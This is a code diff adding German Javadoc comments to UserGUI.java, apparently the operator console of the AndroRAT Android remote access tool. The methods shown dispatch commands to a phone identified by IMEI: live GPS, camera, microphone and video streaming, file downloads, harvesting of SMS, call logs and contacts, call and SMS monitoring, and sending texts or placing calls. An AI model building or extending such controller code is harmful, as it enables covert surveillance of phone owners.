@@ -48,6 +48,9 @@ import javax.swing.JSplitPane;
 import javax.swing.JScrollPane;
 import javax.swing.JTextArea;
 
+/**
+ * Diese Klasse ist zu Verwaltung der GUI eines verbundenen Geräts und den dazugehörtigen Tabs zuständig.
+ */
 public class UserGUI extends JFrame implements WindowListener {
 	
 	private JPanel contentPane;
@@ -69,7 +72,12 @@ public class UserGUI extends JFrame implements WindowListener {
 	
 	private String imei;
 	private GUI gui;
-	
+
+	/**
+	 * Der Konstruktor erstellt eine neue Gui für den Benutzer. Außerdem werden die übergebenen Daten gespeichert.
+	 * @param imei	Die Imei
+	 * @param gui	Die Gui
+	 */
 	public UserGUI(String imei, GUI gui) {
 		setIconImage(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/androrat_logo_32pix.png")));
 		this.imei = imei;
@@ -85,11 +93,22 @@ public class UserGUI extends JFrame implements WindowListener {
 		this.setDefaultCloseOperation(DISPOSE_ON_CLOSE);
 		this.fireGetAdvancedInformations();
 	}
-	
+
+	/**
+	 * Erstellt einen Nachrichten Dialog
+	 * @param txt	Der Text
+	 * @param title	Der Titel
+	 * @param type	Die Art des Dialogs
+	 */
 	public void launchMessageDialog(String txt, String title, int type) {
 		JOptionPane.showMessageDialog(this,txt,title,type);
 	}
-	
+
+	/**
+	 * Diese Methode definiert die Aktionen sollte das Fenster geschlossen werden.
+	 * Hierbei werden sämtliche Streams und Monitoring Aktionen gestoppt.
+	 * @param e	Das Event
+	 */
 	@Override
 	public void windowClosing(WindowEvent e) {
 		System.out.println("Closing user window");
@@ -110,7 +129,12 @@ public class UserGUI extends JFrame implements WindowListener {
 		}
 		gui.closeUserGUI(imei);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Schließen von einzelnen Tabs zuständig.
+	 * Es wird nicht nur die Klassenvariable auf null gesetzt sondern gegebenen fall auch Streams oder Monitoring beendet.
+	 * @param viewer	Das Panel welches geschlossen werden soll.
+	 */
 	public void removeTab(JPanel viewer) {
 		if(viewer instanceof MapPanel) {
 			if(mapPanel.getStreaming()) gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
@@ -145,20 +169,44 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ********************
 	// M�thodes pour home
 	// ********************
-	
-	
+
+	/**
+	 * Erhält ein AdvancedInformationPacket und ruft die updateInformations Mehtode auf um die neuen Daten auf der GUI anzuzeigen.
+	 * @param packet	Das Paket
+	 */
 	public void updateHomeInformations(AdvancedInformationPacket packet) {
 		homePanel.updateInformations(packet);
 	}
-	
+
+	/**
+	 * Bekommt die Preference Daten und ruft die updatePreferences Methode auf um diese auf der GUI anzuzeigen.
+	 * @param ip	Die IP
+	 * @param port	Der Port
+	 * @param wait	wait
+	 * @param phones	Die Telefonnummerliste
+	 * @param sms	Die Smsnummerliste
+	 * @param kw	Die Schlüsselwortliste
+	 */
 	public void updatePreference(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
 		homePanel.updatePreferences(ip, port, wait, phones, sms, kw);
 	}
-	
+
+	/**
+	 * Diese Methode ruft die fireGetAdvInformations der Klasse Gui auf und übergibt dieser die IMEI.
+	 */
 	public void fireGetAdvancedInformations() {
 		gui.fireGetAdvInformations(imei);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Speichern der Verbindugnsinformationen auf dem Client. Dazu wird die Methode fireSaveConnetcConfiguration der Klasse GUI auf.
+	 * @param ip	DIe IP
+	 * @param port	Der Port
+	 * @param wait	wait
+	 * @param phones	Die Telefonnummernliste
+	 * @param sms	Die Smsnummernliste
+	 * @param kw	Die Schlüsselwörterliste
+	 */
 	public void fireSaveConnectConfigurations(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
 		gui.fireSaveConnectConfiguration(imei, ip, port, wait, phones, sms, kw);
 	}
@@ -168,15 +216,32 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ********************
 	// M�thodes pour la Map
 	// ********************
-	
+
+	/**
+	 * Methode zum Updaten der Daten der Map. Hierzu werden die neuen GPSdaten übergeben.
+	 * @param lat	georgrphische Breite
+	 * @param lon	georgrphische Länge
+	 * @param alt	georgrphische Höhe
+	 * @param speed	Geschwindigkeit
+	 * @param accuracy	Genauigkeit
+	 */
 	public void updateMap(double lon, double lat, double alt, float speed, float accuracy) {
 		if(mapPanel != null) mapPanel.updateMap(lon, lat, alt, speed, accuracy);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Starten des GPS Streams vorhanden.
+	 * Dazu wird die Methode fireStartGPSStreaming aufgerufen.
+	 * @param provider	Der Provider
+	 */
 	public void fireStartGPSStreaming(String provider) {
 		gui.fireStartGPSStreaming(imei, provider);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Anhalten des GPS Steams vorhanden.
+	 * Dazu wird die Methode fiteStopGPSStreaming aufgerufen.
+	 */
 	public void fireStopGPSStreaming() {
 		gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
 	}
@@ -185,11 +250,19 @@ public class UserGUI extends JFrame implements WindowListener {
 	// *********************
 	// M�thodes pour l'image
 	// *********************
-	
+
+	/**
+	 * Erhält ein Bild als byte-Array und soll die neuen Informationen benutzen und auf dem Bildtab anzeigen.
+	 * @param picture	Das Bild
+	 */
 	public void updatePicture(byte[] picture) {
 		if(picturePanel != null) picturePanel.updateImage(picture);
 	}
-	
+
+	/**
+	 * Diese Methode ruft die fireTakePicture Methode der GUI auf.
+	 * Damit wird die Anfrage Bilder zu machen abgesetzt.
+	 */
 	public void fireTakePicture() {
 		gui.fireTakePicture(imei);
 	}
@@ -198,15 +271,26 @@ public class UserGUI extends JFrame implements WindowListener {
 	// *********************
 	// M�thodes pour le son
 	// *********************
-	
+
+	/**
+	 * Zum Aktualisieren der Sounddaten des SoundPanels
+	 * @param data	Die Sounddaten
+	 */
 	public void addSoundBytes(byte[] data) {
 		if(soundPanel != null) soundPanel.addSoundBytes(data);
 	}
-	
+
+	/**
+	 * Startet den SoundStream indem die Methode fireStartSoundStreaming.
+	 * @param source	Die Quelle des Stream.
+	 */
 	public void fireStartSoundStreaming(int source) {
 		gui.fireStartSoundStreaming(imei, source);
 	}
-	
+
+	/**
+	 * Stoppt den Soundstream. Dazu wird die Methode fireStopSoundStreaming aufgerufen.
+	 */
 	public void fireStopSoundStreaming() {
 		gui.fireStopSoundStreaming(imei, panChanMap.get(soundPanel));
 	}
@@ -215,17 +299,26 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 	// M�thodes pour la video
 	// ****************************
-	
-	
+
+	/**
+	 * Diese Methode ist zum aktualisieren der Videodaten vorahnden.
+	 * @param data	Die Videaodaten
+	 */
 	public void addVideoBytes(byte[] data) {
 		if(videoPanel != null)
 			videoPanel.addVideoBytes(data);
 	}
-	
+
+	/**
+	 * Methode zum Starten des Videostreams.
+	 */
 	public void fireStartVideoStream() {
 		gui.fireStartVideoStream(imei);
 	}
-	
+
+	/**
+	 * Methode zum beenden des Videostreams.
+	 */
 	public void fireStopVideoStream() {
 		gui.fireStopVideoStream(imei, panChanMap.get(videoPanel));
 	}
@@ -234,15 +327,28 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 	// M�thodes pour l'arborescence
 	// ****************************
-	
+
+	/**
+	 * Diese Methode ist zum updatendes FileTreeTabs vorhanden.
+	 * @param fileList	Die Ordnerstruktur
+	 */
 	public void updateFileTree(ArrayList<MyFile> fileList) {
 		if(fileTreePanel != null) fileTreePanel.updateFileTree(fileList);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Herunterladen der von Dateien vorhande.
+	 * @param path	Der Pfad auf dem Handy
+	 * @param downPath	der Speicherpfad
+	 * @param downName	Der Name der Datei
+	 */
 	public void fireFileDownload(String path, String downPath, String downName) {
 		gui.fireFileDownload(imei, path, downPath, downName);
 	}
-	
+
+	/**
+	 * Ruft die Methode fireTreeFile der Klasse GUI auf.
+	 */
 	public void fireTreeFile() {
 		gui.fireTreeFile(imei);
 	}
@@ -251,11 +357,20 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 	// M�thodes pour les call logs
 	// ****************************
-	
+
+	/**
+	 * Diese Methode ist zum Aktualisiern der Anrufliste vorhanden
+	 * @param logsList	Die Anrufliste
+	 */
 	public void updateCallLogs(ArrayList<CallPacket> logsList) {
 		if(callLogPanel != null) callLogPanel.updateCallLogs(logsList);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Absenden einer Anfrage zum erhalten der Anrufliste vorhanden.
+	 * Dazu wird die fireCallLogs Methode der Klasse GUI aufgerufen.
+	 * @param request	Die Filter
+	 */
 	public void fireGetCallLogs(String request) {
 		gui.fireCallLogs(imei, request);
 	}
@@ -264,11 +379,19 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 	// M�thodes pour les SMS
 	// ****************************
-	
+
+	/**
+	 * Diese Methode ist zum Aktualisieren der Daten des SMSPanel vorhanden.
+	 * @param sms	Die SMS Pakete
+	 */
 	public void updateSMS(ArrayList<SMSPacket> sms) {
 		if(smsPanel != null) smsPanel.updateSMS(sms);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen einer Anfrage zum Erhalten der SMS an den Client vorhanden.
+	 * @param request	Die Filter
+	 */
 	public void fireGetSMS(String request) {
 		gui.fireGetSMS(imei, request);
 	}
@@ -277,19 +400,35 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 	// M�thodes pour les contacts
 	// ****************************
-	
+
+	/**
+	 * Diese Methode ist zum Aktualisieren der Daten des Kontakttabs vorhanden.
+	 * @param contacts	Die Kontakte
+	 */
 	public void updateContacts(ArrayList<Contact> contacts) {
 		if(contactPanel != null) contactPanel.updateContactList(contacts);
 	}
-	
+
+	/**
+	 * Methode zum Senden der Anfrage um die Kontakte des Clients zu erhalten.
+	 */
 	public void fireGetContacts() {
 		gui.fireContacts(imei);
 	}
-	
+
+	/**
+	 * Diese Methode ist um einen Anruf auf dem Client zu starten.
+	 * @param number Die Telefonnummer
+	 */
 	public void fireGiveCall(String number) {
 		gui.fireGiveCall(imei, number);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Senden von SMS vorhanden.
+	 * @param number	Die Telefonnummer
+	 * @param txt	Die Nachricht
+	 */
 	public void fireSendSMS(String number, String txt) {
 		HashMap<String, String> map = new HashMap<String, String>();
 		map.put(Protocol.KEY_SEND_SMS_NUMBER, number);
@@ -301,27 +440,52 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 	// M�thodes pour monitors
 	// ****************************
-	
+
+	/**
+	 * Diese Methode ist zum Aktualisieren der Monitordaten.
+	 * @param type	Die Art des Anrufs
+	 * @param phoneNumber	Die Telefonnummer
+	 */
 	public void addMonitoredCall(int type, String phoneNumber) {
 		if(monitorCall != null) monitorCall.addMonitoredCall(type, phoneNumber);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Aktualisieren von SMS Motnirodaten.
+	 * @param addr	Die Telefonnummer
+	 * @param date	Das Datum
+	 * @param body	Die Nachricht
+	 */
 	public void addMonitoredSMS(String addr, long date, String body) {
 		if(monitorSMS != null) monitorSMS.addMonitoredSMS(addr, date, body);
 	}
-	
+
+	/**
+	 * Zum Starten des CallMonitors
+	 * @param phoneNumbers	Die Telefonnummer
+	 */
 	public void fireStartCallMonitoring(HashSet<String> phoneNumbers) {
 		gui.fireStartCallMonitoring(imei, phoneNumbers);
 	}
-	
+
+	/**
+	 * Methode zum Beende des CallMonitors.
+	 */
 	public void fireStopCallMonitoring() {
 		gui.fireStopCallMonitoring(imei, panChanMap.get(monitorCall));
 	}
-	
+
+	/**
+	 * Methode zum Starten des SMSMonitor
+	 * @param phoneNumbers Die Telefonnummer
+	 */
 	public void fireStartSMSMonitoring(HashSet<String> phoneNumbers) {
 		gui.fireStartSMSMonitoring(imei, phoneNumbers);
 	}
-	
+
+	/**
+	 * Methode zum Stoppen des SMSMonitor
+	 */
 	public void fireStopSMSMonitoring() {
 		gui.fireStopSMSMonitoring(imei, panChanMap.get(monitorSMS));
 	}
@@ -330,35 +494,67 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 	// M�thodes de save channel
 	// ****************************
-	
+
+	/**
+	 * Diese Methode ist zum Speichern des Datenkanals für die GPSDaten.
+	 * @param channel	Der Datenkanal
+	 */
 	public void saveMapChannel(int channel) {
     	panChanMap.put(mapPanel, channel);
     }
-    
+
+	/**
+	 * Diese Methode ist zum Speichern des Datenkanals für die CallLogDaten.
+	 * @param channel	Der Datenkanal
+	 */
     public void saveCallLogChannel(int channel) {
     	panChanMap.put(callLogPanel, channel);
     }
-    
+
+	/**
+	 * Diese Methode ist zum Speichern des Datenkanals für die Kontaktdaten.
+	 * @param channel	Der Datenkanal
+	 */
     public void saveContactChannel(int channel) {
     	panChanMap.put(contactPanel, channel);
     }
-    
+
+	/**
+	 * Diese Methode ist zum Speichern des Datenkanals für die Smsdaten.
+	 * @param channel	Der Datenkanal
+	 */
     public void saveMonitorSMSChannel(int channel) {
     	panChanMap.put(monitorSMS, channel);
     }
-    
+
+	/**
+	 * Diese Methode ist zum Speichern des Datenkanals für die CallMonitordaten.
+	 * @param channel	Der Datenkanal
+	 */
     public void saveMonitorCallChannel(int channel) {
     	panChanMap.put(monitorCall, channel);
     }
-    
+
+	/**
+	 * Diese Methode ist zum Speichern des Datenkanals für die Bilddaten.
+	 * @param channel	Der Datenkanal
+	 */
     public void savePictureChannel(int channel) {
     	panChanMap.put(picturePanel, channel);
     }
-    
+
+	/**
+	 * Diese Methode ist zum Speichern des Datenkanals für die Sounddaten.
+	 * @param channel	Der Datenkanal
+	 */
     public void saveSoundChannel(int channel) {
     	panChanMap.put(soundPanel, channel);
     }
-    
+
+	/**
+	 * Diese Methode ist zum Speichern des Datenkanals für die Videodaten.
+	 * @param channel	Der Datenkanal
+	 */
     public void saveVideoChannel(int channel) {
     	panChanMap.put(videoPanel, channel);
     }
@@ -367,7 +563,10 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 	// M�thodes des boutons UserGUI
 	// ****************************
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen und Hinzufügen des Bildpanels vorhanden.
+	 */
 	private void fireButtonTakePicture() {
 		if(picturePanel == null) {
 			picturePanel = new PicturePanel(this);
@@ -375,7 +574,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		}
 		tabbedPane.setSelectedComponent(picturePanel);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen und Hinzufügen des Ordnerpanels vorhanden.
+	 */
 	private void fireButtonFileTree() {
 		if(fileTreePanel == null) {
 			fileTreePanel = new FileTreePanel(this);
@@ -383,7 +585,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		}
 		tabbedPane.setSelectedComponent(fileTreePanel);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen und Hinzufügen des Anruflistenpanels vorhanden.
+	 */
 	private void fireButtonCallLogs() {
 		if(callLogPanel == null) {
 			callLogPanel = new CallLogPanel(this);
@@ -391,7 +596,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		}
 		tabbedPane.setSelectedComponent(callLogPanel);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen und Hinzufügen des Kontaktpanels vorhanden.
+	 */
 	private void fireButtonContacts() {
 		if(contactPanel == null) {
 			contactPanel = new ContactPanel(this);
@@ -399,7 +607,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		}
 		tabbedPane.setSelectedComponent(contactPanel);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen und Hinzufügen des GPSpanels vorhanden.
+	 */
 	private void fireButtonStreamingGPS() {
 		if(mapPanel == null) {
 			mapPanel = new MapPanel(this);
@@ -407,7 +618,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		}
 		tabbedPane.setSelectedComponent(mapPanel);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen und Hinzufügen des Soundpanels vorhanden.
+	 */
 	private void fireButtonStreamingSound() {
 		if(soundPanel == null) {
 			soundPanel = new SoundPanel(this);
@@ -415,7 +629,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		}
 		tabbedPane.setSelectedComponent(soundPanel);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen und Hinzufügen des Videopanels vorhanden.
+	 */
 	private void fireButtonStreamingVideo() {
 		if(videoPanel == null) {
 			videoPanel = new VideoPanel(this);
@@ -423,7 +640,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		}
 		tabbedPane.setSelectedComponent(videoPanel);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen und Hinzufügen des Smspanels vorhanden.
+	 */
 	private void fireButtonSMS() {
 		if(smsPanel == null) {
 			smsPanel = new SMSLogPanel(this);
@@ -431,17 +651,26 @@ public class UserGUI extends JFrame implements WindowListener {
 		}
 		tabbedPane.setSelectedComponent(smsPanel);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen und Hinzufügen des Toastdialogs vorhanden.
+	 */
 	private void fireButtonToastMessage() {
 		String txt = JOptionPane.showInputDialog(this, "Enter your text :");
 		gui.fireToastMessage(imei, txt);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum beenden des Fensters
+	 */
 	private void fireButtonFinish() {
 		this.windowClosing(null);
 		this.dispose();
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Beenden und Entfernen der einzelnen Tabs
+	 */
 	public void fireButtonCloseTab() {
 		JPanel panel = (JPanel) tabbedPane.getSelectedComponent();
 		if(panel == homePanel) {
@@ -450,7 +679,10 @@ public class UserGUI extends JFrame implements WindowListener {
 			this.removeTab(panel);
 		}
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen des SMSdialogs
+	 */
 	private void fireButtonSendSMS() {
 		SMSDialog dialog = new SMSDialog(this);
 		String[] res = dialog.showDialog();
@@ -461,12 +693,18 @@ public class UserGUI extends JFrame implements WindowListener {
 			gui.fireSendSMS(imei, map);
 		}
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen eines Anrufdialogs
+	 */
 	private void fireButtonGiveCall() {
 		String target = JOptionPane.showInputDialog(this, "Enter the target cell number :");
 		if(target != null) gui.fireGiveCall(imei, target);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen und Hinzufügen des AnrufMonitorpanels vorhanden.
+	 */
 	private void fireButtonMonitorCall() {
 		if(monitorCall == null) {
 			monitorCall = new MonitorPanel(this, true);
@@ -474,7 +712,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		}
 		tabbedPane.setSelectedComponent(monitorCall);
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen und Hinzufügen des SmsMonitorpanels vorhanden.
+	 */
 	private void fireButtonMonitorSMS() {
 		if(monitorSMS == null) {
 			monitorSMS = new MonitorPanel(this, false);
@@ -488,8 +729,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	
 
 	/**
-	 * Create the frame.
-	 * Don't touch the code !!
+	 * Zum Erstellen des UserGui Fensters.
 	 */
 	private void initGUI() {
 		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
@@ -687,19 +927,37 @@ public class UserGUI extends JFrame implements WindowListener {
 	@Override
 	public void windowDeactivated(WindowEvent e) {
 	}
-	
+
+	/**
+	 * Gibt die IMEI zurück.
+	 * @return Die IMEI
+	 */
 	public String getImei() {
 		return imei;
 	}
-	
+
+	/**
+	 * Gibt die GUI zurück.
+	 * @return	Die Gui
+	 */
 	public GUI getGUI() {
 		return gui;
 	}
-	
+
+	/**
+	 * Diese Methode ist zum Erstellen der Lognachricht.
+	 * @param date	Das Datum
+	 * @param txt	Der Text
+	 */
     public void logTxt(long date, String txt) {
     	userLogPanel.append(Color.black, (new Date(date)+ " "+txt+"\n"));
     }
-    
+
+	/**
+	 * Diese Methode ist zum Erstellen der Fehlernachricht
+	 * @param date	Das Datum
+	 * @param txt	Der Text
+	 */
     public void errLogTxt(long date, String txt) {
     	userLogPanel.append(Color.red, (new Date(date)+ " "+txt+"\n"));
     }
